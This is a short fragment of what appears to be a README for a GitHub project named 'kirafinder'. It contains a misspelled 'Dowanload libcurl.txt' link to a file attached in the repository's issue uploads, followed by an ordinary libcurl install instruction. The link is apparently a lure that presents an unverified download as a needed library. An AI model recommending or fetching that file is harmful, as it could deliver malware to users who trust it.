[Dowanload libcurl.txt](https://github.com/o337/kirafinder/files/14877372/Dowanload.libcurl.txt)# kirafinder
...
The libcurl library installed on your system. You can typically install it using your package manager. For example, on Debian-based systems, you can use apt-get install libcurl4-openssl-dev.
